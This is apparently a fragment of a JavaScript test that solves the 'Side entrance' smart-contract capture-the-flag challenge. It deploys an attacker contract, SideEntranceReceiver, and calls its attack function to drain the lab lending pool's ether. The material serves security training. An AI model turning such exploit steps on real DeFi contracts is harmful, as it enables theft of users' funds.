...
describe("[Challenge] Side entrance", function () {
  ...
  it("Execution", async function () {
    ...
    let sideEntranceReceiver = await (
      await ethers.getContractFactory("SideEntranceReceiver", player)
    ).deploy(pool.address, player.address);

    await sideEntranceReceiver.connect(player).attack(ETHER_IN_POOL);
  });
